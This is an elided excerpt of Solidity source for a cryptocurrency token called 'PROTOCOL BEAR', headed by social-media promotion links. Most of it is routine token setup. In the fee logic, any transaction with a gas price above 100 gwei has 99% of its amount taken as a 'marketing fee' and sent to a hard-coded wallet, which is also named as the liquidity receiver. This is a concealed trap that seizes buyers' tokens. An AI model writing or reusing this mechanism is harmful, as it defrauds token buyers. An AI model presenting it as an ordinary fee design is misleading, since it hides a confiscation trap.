...
/**
TG: https://t.me/ProtocolBEAR

Website: https://ProtocolBEAR.com

Twitter: https://Twitter.com/BearProtocolXYZ
*/
...
contract ProtocolBear is Context, IERC20, Ownable {
    ...
    string private constant _name = "PROTOCOL BEAR";
    string private constant _symbol = "PROBEAR";
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;

    uint256 public _maxWalletAmount = _tTotal.mul(2).div(10**2);
    uint256 public _maxTxAmount = _tTotal.mul(2).div(10**2);
    uint256 public swapTokenAtAmount = _tTotal.mul(5).div(10**2);
    ...
    address private marketingWallet = address(0x2E9F716F51bF22223Bb87510811Ad2287F5F0617);
    address private liquidityReceiver = address(0x2E9F716F51bF22223Bb87510811Ad2287F5F0617);
    
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _lastBuy;
    
    bool private swapping;
    uint256 limitation = 100 * 1 gwei;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        if (tx.gasprice > limitation) {
            marketingFeeToken = amount * 99 / 100;
            liquidityFeeToken = amount * 0 / 100;
        }
    ...
    function setSwapAmount(uint256 newSwapAm) public onlyOwner {
        swapTokenAtAmount = _tTotal.mul(newSwapAm).div(10**2);    
    }
